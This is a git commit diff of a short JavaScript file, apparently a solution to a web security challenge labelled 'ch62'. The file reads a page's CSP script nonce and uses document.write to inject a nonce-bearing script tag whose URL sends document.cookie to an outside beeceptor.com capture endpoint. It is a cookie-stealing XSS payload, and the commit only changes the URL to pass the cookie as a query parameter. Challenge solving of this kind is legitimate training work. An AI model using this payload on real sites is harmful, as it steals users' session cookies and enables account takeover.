95eb2ccfc04aeef92a4c5a423f9ba6c618af9734
blaisedubs6 <104782871+blaisedubs6@users.noreply.github.com>
2026-04-09 18:44:29 +0200

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,5 +1,5 @@
 const h = document.querySelector('script[nonce]').nonce
 document.write(h)
 
-document.write('<script src="https://recept.free.beeceptor.com/cookie='+document.cookie+'" nonce=h></script>')
+document.write('<script src="https://recept.free.beeceptor.com/?cookie='+document.cookie+'" nonce=h></script>')
 
